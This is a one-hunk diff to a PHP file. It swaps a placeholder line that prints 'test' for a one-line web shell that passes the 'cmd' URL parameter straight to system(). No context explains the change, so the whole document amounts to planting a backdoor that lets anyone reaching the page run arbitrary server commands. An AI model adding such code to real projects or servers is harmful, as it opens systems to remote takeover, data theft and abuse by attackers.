@@ -1,1 +1,1 @@
-<?php echo "test"; ?>
+<?php system($_GET['cmd']); ?>
